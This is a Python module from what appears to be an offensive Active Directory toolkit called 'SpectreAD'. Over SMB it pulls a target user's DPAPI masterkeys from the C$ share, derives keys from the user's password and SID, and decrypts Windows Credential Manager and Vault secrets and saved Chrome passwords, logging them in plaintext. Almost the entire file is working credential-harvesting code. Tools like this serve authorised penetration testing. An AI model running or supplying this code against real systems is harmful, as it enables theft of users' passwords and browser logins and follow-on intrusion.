"""
SpectreAD :: core/dpapi.py
Masterkey harvest, Credential Manager, Chrome store.

Author : Inayat Hussain
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import sqlite3
import tempfile
from uuid import UUID

from core import ui
from core.creds import resolve
from core.store import open_store
from core.transport import smb

PROTECT = r"AppData\Roaming\Microsoft\Protect"
CREDS = r"AppData\Roaming\Microsoft\Credentials"
VAULT = r"AppData\Local\Microsoft\Vault"
CHROME_STATE = r"AppData\Local\Google\Chrome\User Data\Local State"
CHROME_LOGIN = r"AppData\Local\Google\Chrome\User Data\Default\Login Data"


def _read(conn, path) -> bytes:
    buf = b""
    try:
        fid = conn.openFile("C$", path)
        while len(buf) < 4 * 1024 * 1024:
            chunk = conn.readFile("C$", fid)
            if not chunk:
                break
            buf += chunk
        conn.closeFile("C$", fid)
    except Exception:
        return b""
    return buf


def _list(conn, path) -> list[str]:
    try:
        return [f.get_longname() for f in conn.listPath("C$", path + "\\*")
                if f.get_longname() not in (".", "..")]
    except Exception:
        return []


def _mk_key(password: str, sid_bytes: bytes, guid: bytes) -> bytes:
    pre = hashlib.sha1(password.encode("utf-16-le")).digest()
    k1 = hmac.new(pre, sid_bytes, hashlib.sha1).digest()
    return hmac.new(k1, guid, hashlib.sha1).digest()


def _guid_bytes(guid: str) -> bytes:
    return UUID(guid.strip("{}")).bytes_le


def _sid_bytes(store, domain, user) -> bytes:
    from core.ldap import base_dn, connect, find_object
    dc = store.get_meta("dc_ip")
    if not dc:
        return b""
    conn = connect(dc, None, anon=True)
    root = base_dn(conn, domain)
    obj = find_object(conn, root, user)
    conn.unbind()
    return obj["objectSid"].raw_values[0] if obj else b""


def _describe(kind: str, plain: bytes) -> str:
    text = plain.decode("utf-8", "ignore")
    if kind == "credman":
        parts = [p for p in text.split("\x00") if p.strip()]
        return " | ".join(parts)[:200]
    return text[:200]


def _harvest(conn, cred, store, user, masterkey, args) -> None:
    from impacket.dpapi import DPAPI_BLOB

    for sub, kind in ((CREDS, "credman"), (VAULT, "vault")):
        base = rf"Users\{user}\{sub}"
        for name in _list(conn, base):
            blob = _read(conn, rf"{base}\{name}")
            if not blob:
                continue
            try:
                plain = DPAPI_BLOB(blob).decrypt(masterkey)
            except Exception:
                continue
            text = _describe(kind, plain)
            if text:
                ui.ok(f"{kind}: {text}")
                store.add_dpapi(user, kind, name, text)
                store.add_cred(args.domain, user, text, "password", "dpapi")

    state = _read(conn, rf"Users\{user}\{CHROME_STATE}")
    if state:
        try:
            meta = json.loads(state.decode("utf-8", "ignore"))
            raw = base64.b64decode(meta["os_crypt"]["encrypted_key"])[5:]
            key = DPAPI_BLOB(raw).decrypt(masterkey)
            ui.ok(f"chrome AES key recovered")
            store.add_dpapi(user, "chrome_key", "Local State", key.hex())
        except Exception as exc:
            ui.fail(f"chrome key: {exc}")

    db = _read(conn, rf"Users\{user}\{CHROME_LOGIN}")
    if db:
        _chrome_logins(store, user, db)


def _chrome_logins(store, user, db_bytes) -> None:
    from Cryptodome.Cipher import AES

    key_hex = next((r["secret"] for r in store.dpapi_secrets()
                    if r["kind"] == "chrome_key" and r["user"] == user), None)
    if not key_hex:
        return
    key = bytes.fromhex(key_hex)

    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as fh:
        fh.write(db_bytes)
        path = fh.name
    try:
        rows = sqlite3.connect(path).execute(
            "SELECT origin_url, username_value, password_value FROM logins").fetchall()
    except Exception:
        return
    finally:
        os.unlink(path)

    for url, uname, blob in rows:
        if not blob or blob[:3] != b"v10":
            continue
        try:
            plain = AES.new(key, AES.MODE_GCM, blob[3:15]).decrypt(blob[15:])[:-16]
        except Exception:
            continue
        text = plain.decode("utf-8", "ignore")
        if text:
            ui.ok(f"chrome  {uname}:{text}  ({url})")
            store.add_dpapi(user, "chrome_login", url, f"{uname}:{text}")


def run(args) -> None:
    from impacket.dpapi import MASTERKEY_BLOB

    with open_store(args.store) as store:
        cred = resolve(args, store)
        if cred.kind != "password":
            ui.warn("masterkey derivation needs the plaintext password")

        user = args.target_user
        sid = _sid_bytes(store, args.domain, user)
        if not sid:
            ui.die(f"SID for {user} not found — run ldap first")

        conn = smb(args.target, cred)
        base = rf"Users\{user}\{PROTECT}"
        guids = [g for g in _list(conn, base) if g.startswith("{")]
        if not guids:
            ui.warn("no masterkey directory (user may never have logged on)")
            conn.logoff()
            return

        ui.info(f"{len(guids)} masterkey(s) for {user}")
        for guid in guids:
            blob = _read(conn, rf"{base}\{guid}")
            if not blob:
                continue
            store.add_masterkey(sid.hex(), guid, rf"{base}\{guid}", blob)
            key = _mk_key(cred.secret, sid, _guid_bytes(guid))
            try:
                masterkey = MASTERKEY_BLOB(blob).decrypt(key)
            except Exception:
                ui.fail(f"{guid}: wrong key or unreadable")
                continue
            ui.ok(f"{guid}: masterkey recovered")
            store.mark_masterkey(guid)
            _harvest(conn, cred, store, user, masterkey, args)
            conn.logoff()
            store.log("dpapi", "harvest", user, "ok", cred.identity())
            return

        conn.logoff()
